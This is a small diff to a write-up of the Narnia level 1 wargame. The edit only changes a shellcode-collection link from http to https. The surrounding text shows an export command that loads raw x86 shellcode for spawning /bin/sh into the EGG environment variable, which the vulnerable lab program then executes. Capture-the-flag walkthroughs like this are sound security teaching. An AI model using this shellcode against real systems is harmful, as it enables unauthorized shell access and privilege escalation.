@@ -84,7 +84,7 @@ int main(){
 }
 ```
 
-This programm will literally execute whatever is on the `EGG` [enviroment variable](https://en.wikipedia.org/wiki/Environment_variable). And by this I mean that the programm will interpret whatever the bytes in the `EGG` are and execute them as raw assembly instructions. Time for some shellcode! I really like the collection of [shell storm](http://shell-storm.org/shellcode/).
+This programm will literally execute whatever is on the `EGG` [enviroment variable](https://en.wikipedia.org/wiki/Environment_variable). And by this I mean that the programm will interpret whatever the bytes in the `EGG` are and execute them as raw assembly instructions. Time for some shellcode! I really like the collection of [shell storm](https://shell-storm.org/shellcode/).
 We can assign an enviroment variable with the `export` command. I tried different shellcodes and at the end this worked for me:
 ```
 narnia1@narnia:/narnia$ export EGG=$'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'
